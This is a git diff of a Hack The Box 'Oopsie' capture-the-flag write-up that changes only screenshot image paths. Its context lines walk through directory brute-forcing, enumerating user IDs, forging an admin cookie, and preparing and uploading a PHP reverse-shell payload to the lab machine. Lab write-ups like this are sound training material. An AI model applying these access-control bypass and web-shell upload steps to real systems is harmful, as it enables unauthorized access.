@@ -62,7 +62,7 @@ HTB - Oopsie
 		* https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
 	* Ran `dirbuster` with `http://10.10.10.28:80`, wordlist `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
 4. Dirbuster found login page at `http://10.10.10.28/cdn-cgi/login/admin.php`.
-	![Screenshot-20200503233429-839x692.png](./resources/cd7cc0a185be432e83a5136bd3a8ef04.png)
+	![Screenshot-20200503233429-839x692.png](images/cd7cc0a185be432e83a5136bd3a8ef04.png)
 	
 	```
 	DirBuster 1.0-RC1 - Report
@@ -132,7 +132,7 @@ HTB - Oopsie
 	* We press Clear to remove the pre-populated payload positions, select the Id value (1), and click Add. Next, click on the Payloads tab.
 	* We can generate a sequential list of 1-100 using a simple bash loop: ```for i in `seq 1 100`; do echo $i; done```. Paste the output into the Payloads box.
 	* ID 30 shows that `super admin` is `86575`
-		![Screenshot-20200503234934-870x635.png](./resources/614acba83c8243d8b7d19ab3c83d1bd1.png)
+		![Screenshot-20200503234934-870x635.png](images/614acba83c8243d8b7d19ab3c83d1bd1.png)
 	* Go to `Uploads` page and change `Cookie: user=34322; role=admin` to `Cookie: user=86575; role=admin`
 7. Use [msfvenom cheatsheet 1](https://netsec.ws/?p=331) to create payload:
 	```
@@ -140,7 +140,7 @@ HTB - Oopsie
 	cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n' > shell.php && xclip -selection clipboard -o >> shell.php
 	```
 	Uploads directory found before by `dirbuster`: `/uploads/`. Upload the payload using the web portal.
-	![Screenshot-20200504001507-546x213.png](./resources/88f06b7756964cea83c0c39117e82436.png)
+	![Screenshot-20200504001507-546x213.png](images/88f06b7756964cea83c0c39117e82436.png)
 	
 	Open up port to listen on:
 	```
